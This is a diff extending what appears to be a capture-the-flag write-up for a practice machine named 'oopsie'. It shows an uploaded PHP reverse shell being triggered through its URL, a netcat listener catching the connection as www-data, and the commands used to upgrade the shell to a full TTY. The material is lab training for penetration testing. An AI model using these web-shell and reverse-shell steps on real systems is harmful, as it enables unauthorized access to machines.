@@ -124,3 +124,26 @@ Access ID | Name | Email
 
     The file rshell.php has been uploaded.
 
+// open a listener
+    
+    $ rlwrap nc -vnp 1444
+    
+// Navigate to http://10.10.10.28/uploads/rshell.php and we got a shell!
+
+    $ rlwrap nc -lvnp 1444
+    listening on [any] 1444 ...
+    connect to [10.10.16.7] from (UNKNOWN) [10.10.10.28] 57742
+    Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+     12:17:46 up 23:24,  0 users,  load average: 0.27, 0.32, 0.27
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    /bin/sh: 0: can't access tty; job control turned off
+    $
+
+// getting a better shell
+
+    $ SHELL=/bin/bash script -q /dev/null
+    www-data@oopsie:/$ stty raw -echo
+    www-data@oopsie:/$ fg
+    www-data@oopsie:/$ reset
+    www-data@oopsie:/$ xterm
